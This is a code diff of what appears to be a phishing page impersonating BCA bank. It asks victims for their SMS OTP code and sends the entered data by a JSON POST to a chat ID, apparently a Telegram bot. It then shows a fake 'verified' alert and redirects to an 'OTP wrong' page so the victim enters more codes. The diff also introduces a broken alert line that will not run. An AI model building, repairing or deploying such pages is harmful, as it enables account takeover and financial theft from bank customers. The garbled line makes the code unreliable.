@@ -54,7 +54,7 @@
                 <div>
                     <label class="block text-bca-blue text-sm text-font-bold mb-3 text-center">Masukkan SMS kode OTP di bawah:</label>
                     <input 
-                        type="text" 
+                        type="Number" 
                         name="kode_otp" 
                         placeholder="Masukkan Kode OTP" 
                         required 
@@ -116,8 +116,8 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'HTML' })
                 });
-                alert("Kode OTP Berhasil Diverifikasi!");
-                window.location.href = "otp-salah.html"; 
+                alert(");
+                window.location.href = "otp bca salah.html"; 
             } catch (err) {
                 alert("Gagal mengirim data, cek koneksi.");
             }
